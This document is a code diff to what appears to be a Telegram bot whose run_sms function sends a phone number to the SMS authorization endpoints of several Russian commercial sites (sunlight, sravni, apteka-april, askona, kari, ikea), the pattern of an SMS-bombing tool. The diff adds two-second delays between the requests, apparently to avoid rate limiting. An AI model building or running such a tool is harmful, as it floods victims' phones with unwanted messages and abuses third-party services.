@@ -6,6 +6,8 @@ import telebot
 
 from threading import Thread
 
+import time 
+
 import config
 
 def run_sms(phone, userid):
@@ -30,6 +32,8 @@ def run_sms(phone, userid):
 
         response1 = requests.post('https://api.sunlight.net/v3/customers/authorization/', headers=headers, data=data)
         print(response1.status_code, 'sunlight')
+
+        time.sleep(2)
 
         cookies = {
             '.ASPXANONYMOUS': 'nXpyv9H4gkmzD_ZKefwG_Q',
@@ -86,6 +90,7 @@ def run_sms(phone, userid):
 
         print(response2.status_code, 'sravni')
 
+        time.sleep(2)
 
         headers = {
             'Connection': 'keep-alive',
@@ -109,7 +114,7 @@ def run_sms(phone, userid):
 
         print(response3.status_code, "apteka-april")
 
-
+        time.sleep(2)
 
 
         headers = {
@@ -138,6 +143,7 @@ def run_sms(phone, userid):
 
         print(response4.status_code, "askona")
 
+        time.sleep(2)
 
         headers = {
             'authority': 'i.api.kari.com',
@@ -164,7 +170,7 @@ def run_sms(phone, userid):
         print(response5.status_code, 'kari')
 
 
-
+        time.sleep(2)
 
         headers = {
             'authority': 'ru.accounts.ikea.com',
